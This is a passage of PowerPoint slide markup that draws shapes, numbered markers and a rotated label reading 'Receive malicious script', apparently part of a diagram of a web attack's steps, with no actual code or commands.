              <a:gd name="T20" fmla="*/ 642 w 471170"/>
              <a:gd name="T21" fmla="*/ 1851 h 471170"/>
              <a:gd name="T22" fmla="*/ 556 w 471170"/>
              <a:gd name="T23" fmla="*/ 1903 h 471170"/>
              <a:gd name="T24" fmla="*/ 466 w 471170"/>
              <a:gd name="T25" fmla="*/ 1921 h 471170"/>
              <a:gd name="T26" fmla="*/ 377 w 471170"/>
              <a:gd name="T27" fmla="*/ 1903 h 471170"/>
              <a:gd name="T28" fmla="*/ 291 w 471170"/>
              <a:gd name="T29" fmla="*/ 1851 h 471170"/>
              <a:gd name="T30" fmla="*/ 210 w 471170"/>
              <a:gd name="T31" fmla="*/ 1764 h 471170"/>
              <a:gd name="T32" fmla="*/ 137 w 471170"/>
              <a:gd name="T33" fmla="*/ 1640 h 471170"/>
              <a:gd name="T34" fmla="*/ 77 w 471170"/>
              <a:gd name="T35" fmla="*/ 1489 h 471170"/>
              <a:gd name="T36" fmla="*/ 34 w 471170"/>
              <a:gd name="T37" fmla="*/ 1322 h 471170"/>
              <a:gd name="T38" fmla="*/ 9 w 471170"/>
              <a:gd name="T39" fmla="*/ 1145 h 471170"/>
              <a:gd name="T40" fmla="*/ 0 w 471170"/>
              <a:gd name="T41" fmla="*/ 961 h 471170"/>
              <a:gd name="T42" fmla="*/ 9 w 471170"/>
              <a:gd name="T43" fmla="*/ 778 h 471170"/>
              <a:gd name="T44" fmla="*/ 34 w 471170"/>
              <a:gd name="T45" fmla="*/ 600 h 471170"/>
              <a:gd name="T46" fmla="*/ 77 w 471170"/>
              <a:gd name="T47" fmla="*/ 433 h 471170"/>
              <a:gd name="T48" fmla="*/ 137 w 471170"/>
              <a:gd name="T49" fmla="*/ 281 h 471170"/>
              <a:gd name="T50" fmla="*/ 210 w 471170"/>
              <a:gd name="T51" fmla="*/ 158 h 471170"/>
              <a:gd name="T52" fmla="*/ 291 w 471170"/>
              <a:gd name="T53" fmla="*/ 70 h 471170"/>
              <a:gd name="T54" fmla="*/ 377 w 471170"/>
              <a:gd name="T55" fmla="*/ 17 h 471170"/>
              <a:gd name="T56" fmla="*/ 466 w 471170"/>
              <a:gd name="T57" fmla="*/ 0 h 471170"/>
              <a:gd name="T58" fmla="*/ 556 w 471170"/>
              <a:gd name="T59" fmla="*/ 17 h 471170"/>
              <a:gd name="T60" fmla="*/ 642 w 471170"/>
              <a:gd name="T61" fmla="*/ 70 h 471170"/>
              <a:gd name="T62" fmla="*/ 723 w 471170"/>
              <a:gd name="T63" fmla="*/ 158 h 471170"/>
              <a:gd name="T64" fmla="*/ 796 w 471170"/>
              <a:gd name="T65" fmla="*/ 281 h 47117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71170" h="471170">
                <a:moveTo>
                  <a:pt x="401862" y="68948"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="432027" y="105877"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="453573" y="146822"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="466501" y="190444"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="470810" y="235405"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="466501" y="280366"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="453573" y="323988"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="432027" y="364933"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="401862" y="401862"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="364933" y="432027"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="323988" y="453573"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="280366" y="466501"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="235405" y="470810"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="190444" y="466501"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="146822" y="453573"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="105877" y="432027"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="68948" y="401862"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="38783" y="364933"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="17237" y="323988"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="4309" y="280366"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="235405"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="4309" y="190444"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="17237" y="146822"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="38783" y="105877"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="68948" y="68948"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="105877" y="38783"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="146822" y="17237"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="190444" y="4309"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="235405" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="280366" y="4309"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="323988" y="17237"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="364933" y="38783"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="401862" y="68948"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:noFill/>
          <a:ln w="25400">
            <a:solidFill>
              <a:srgbClr val="0365C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pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1588">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="163857" name="object 19"/>
          <p:cNvSpPr>
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="7304835" y="4549588"/>
            <a:ext cx="232522" cy="200306"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst>
              <a:gd name="T0" fmla="*/ 249 w 339725"/>
              <a:gd name="T1" fmla="*/ 0 h 284479"/>
              <a:gd name="T2" fmla="*/ 0 w 339725"/>
              <a:gd name="T3" fmla="*/ 1263 h 284479"/>
              <a:gd name="T4" fmla="*/ 765 w 339725"/>
              <a:gd name="T5" fmla="*/ 1124 h 284479"/>
              <a:gd name="T6" fmla="*/ 249 w 339725"/>
              <a:gd name="T7" fmla="*/ 0 h 28447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39725" h="284479">
                <a:moveTo>
                  <a:pt x="110566" y="0"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="0" y="284048"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="339318" y="252590"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="11056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pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1588">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="163858" name="object 25"/>
          <p:cNvSpPr>
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="4041122" y="3808600"/>
            <a:ext cx="231121" cy="200305"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst>
              <a:gd name="T0" fmla="*/ 662 w 339725"/>
              <a:gd name="T1" fmla="*/ 0 h 284479"/>
              <a:gd name="T2" fmla="*/ 0 w 339725"/>
              <a:gd name="T3" fmla="*/ 137 h 284479"/>
              <a:gd name="T4" fmla="*/ 445 w 339725"/>
              <a:gd name="T5" fmla="*/ 1262 h 284479"/>
              <a:gd name="T6" fmla="*/ 662 w 339725"/>
              <a:gd name="T7" fmla="*/ 0 h 28447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39725" h="284479">
                <a:moveTo>
                  <a:pt x="339369" y="0"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="0" y="30962"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="228396" y="283883"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="33936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pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1588">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="26" name="object 26"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm rot="1260000">
            <a:off x="4622427" y="4465580"/>
            <a:ext cx="3192276" cy="243656"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr lIns="0" tIns="0" rIns="0" bIns="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:lnSpc>
                <a:spcPts val="1918"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr sz="3000" baseline="1915" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>Receive </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2030" spc="11" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>malicious</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2030" spc="-72" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="3000" spc="52" baseline="-1915" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>script</a:t>
            </a:r>
            <a:endParaRPr sz="3000" baseline="-1915" dirty="0">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
              <a:cs typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="163860" name="object 27"/>
          <p:cNvSpPr>
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="4441733" y="3667125"/>
            <a:ext cx="322169" cy="331975"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst>
              <a:gd name="T0" fmla="*/ 993 w 471170"/>
              <a:gd name="T1" fmla="*/ 643 h 471170"/>
              <a:gd name="T2" fmla="*/ 1024 w 471170"/>
              <a:gd name="T3" fmla="*/ 848 h 471170"/>
              <a:gd name="T4" fmla="*/ 1036 w 471170"/>
              <a:gd name="T5" fmla="*/ 1056 h 471170"/>
              <a:gd name="T6" fmla="*/ 1027 w 471170"/>
              <a:gd name="T7" fmla="*/ 1260 h 471170"/>
              <a:gd name="T8" fmla="*/ 999 w 471170"/>
              <a:gd name="T9" fmla="*/ 1456 h 471170"/>
              <a:gd name="T10" fmla="*/ 954 w 471170"/>
              <a:gd name="T11" fmla="*/ 1638 h 471170"/>
              <a:gd name="T12" fmla="*/ 893 w 471170"/>
              <a:gd name="T13" fmla="*/ 1799 h 471170"/>
              <a:gd name="T14" fmla="*/ 815 w 471170"/>
              <a:gd name="T15" fmla="*/ 1936 h 471170"/>
              <a:gd name="T16" fmla="*/ 723 w 471170"/>
              <a:gd name="T17" fmla="*/ 2040 h 471170"/>
              <a:gd name="T18" fmla="*/ 623 w 471170"/>
              <a:gd name="T19" fmla="*/ 2105 h 471170"/>
              <a:gd name="T20" fmla="*/ 522 w 471170"/>
              <a:gd name="T21" fmla="*/ 2127 h 471170"/>
              <a:gd name="T22" fmla="*/ 422 w 471170"/>
              <a:gd name="T23" fmla="*/ 2109 h 471170"/>
              <a:gd name="T24" fmla="*/ 327 w 471170"/>
              <a:gd name="T25" fmla="*/ 2051 h 471170"/>
              <a:gd name="T26" fmla="*/ 238 w 471170"/>
              <a:gd name="T27" fmla="*/ 1958 h 471170"/>
              <a:gd name="T28" fmla="*/ 160 w 471170"/>
              <a:gd name="T29" fmla="*/ 1831 h 471170"/>
              <a:gd name="T30" fmla="*/ 94 w 471170"/>
              <a:gd name="T31" fmla="*/ 1673 h 471170"/>
              <a:gd name="T32" fmla="*/ 43 w 471170"/>
              <a:gd name="T33" fmla="*/ 1484 h 471170"/>
              <a:gd name="T34" fmla="*/ 11 w 471170"/>
              <a:gd name="T35" fmla="*/ 1279 h 471170"/>
              <a:gd name="T36" fmla="*/ 0 w 471170"/>
              <a:gd name="T37" fmla="*/ 1071 h 471170"/>
              <a:gd name="T38" fmla="*/ 9 w 471170"/>
              <a:gd name="T39" fmla="*/ 866 h 471170"/>
              <a:gd name="T40" fmla="*/ 36 w 471170"/>
              <a:gd name="T41" fmla="*/ 671 h 471170"/>
              <a:gd name="T42" fmla="*/ 82 w 471170"/>
              <a:gd name="T43" fmla="*/ 489 h 471170"/>
              <a:gd name="T44" fmla="*/ 143 w 471170"/>
              <a:gd name="T45" fmla="*/ 327 h 471170"/>
              <a:gd name="T46" fmla="*/ 221 w 471170"/>
              <a:gd name="T47" fmla="*/ 192 h 471170"/>
              <a:gd name="T48" fmla="*/ 313 w 471170"/>
              <a:gd name="T49" fmla="*/ 87 h 471170"/>
              <a:gd name="T50" fmla="*/ 412 w 471170"/>
              <a:gd name="T51" fmla="*/ 22 h 471170"/>
              <a:gd name="T52" fmla="*/ 514 w 471170"/>
              <a:gd name="T53" fmla="*/ 0 h 471170"/>
              <a:gd name="T54" fmla="*/ 614 w 471170"/>
              <a:gd name="T55" fmla="*/ 19 h 471170"/>
              <a:gd name="T56" fmla="*/ 709 w 471170"/>
              <a:gd name="T57" fmla="*/ 75 h 471170"/>
              <a:gd name="T58" fmla="*/ 797 w 471170"/>
              <a:gd name="T59" fmla="*/ 168 h 471170"/>
              <a:gd name="T60" fmla="*/ 876 w 471170"/>
              <a:gd name="T61" fmla="*/ 296 h 471170"/>
              <a:gd name="T62" fmla="*/ 942 w 471170"/>
              <a:gd name="T63" fmla="*/ 454 h 471170"/>
              <a:gd name="T64" fmla="*/ 993 w 471170"/>
              <a:gd name="T65" fmla="*/ 643 h 47117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71170" h="471170">
                <a:moveTo>
                  <a:pt x="451630" y="142261"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="466021" y="187720"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="470920" y="233728"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="466820" y="279041"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="454217" y="322414"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="433605" y="362603"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="405478" y="398365"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="370331" y="428456"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="328659" y="451630"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="283199" y="466021"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="237191" y="470920"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="191879" y="466820"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="148505" y="454217"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="108316" y="433605"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="72554" y="405478"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="42464" y="370331"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="19289" y="328659"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="4898" y="283199"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="237191"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="4099" y="191879"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="16702" y="148506"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="37315" y="108316"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="65441" y="72554"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="100588" y="42464"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="142261" y="19289"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="187720" y="4898"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="233728" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="279040" y="4099"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="322414" y="16702"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="362603" y="37315"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="398365" y="65441"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="428456" y="100588"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="451630" y="142261"/>
                </a:lnTo>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:noFill/>
          <a:ln w="25400">
            <a:solidFill>
              <a:srgbClr val="0365C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pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1588">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="28" name="object 28"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm rot="1260000">
            <a:off x="4483754" y="3740157"/>
            <a:ext cx="358588" cy="307777"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr lIns="0" tIns="0" rIns="0" bIns="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:lnSpc>
                <a:spcPts val="2405"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr sz="2471" spc="-4" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="1333FF"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>3</a:t>
            </a:r>
            <a:endParaRPr sz="2471">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
              <a:cs typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="163862" name="object 29"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="8110258" y="5427850"/>
            <a:ext cx="334776" cy="320768"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:blipFill dpi="0" rotWithShape="1">
            <a:blip r:embed="rId7"/>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defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr marL="742950" indent="-285750">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr marL="1143000" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr marL="1600200" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr marL="2057400" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl5pPr>
            <a:lvl6pPr marL="2514600" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl6pPr>
            <a:lvl7pPr marL="2971800" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl7pPr>
            <a:lvl8pPr marL="3429000" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl8pPr>
            <a:lvl9pPr marL="3886200" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl9pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1588">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="163863" name="object 30"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="8135471" y="5436254"/>
            <a:ext cx="282949" cy="267540"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:blipFill dpi="0" rotWithShape="1">
            <a:blip r:embed="rId8"/>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defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr marL="742950" indent="-285750">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr marL="1143000" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr marL="1600200" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr marL="2057400" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl5pPr>
            <a:lvl6pPr marL="2514600" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl6pPr>
            <a:lvl7pPr marL="2971800" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl7pPr>
            <a:lvl8pPr marL="3429000" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl8pPr>
            <a:lvl9pPr marL="3886200" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl9pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1588">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
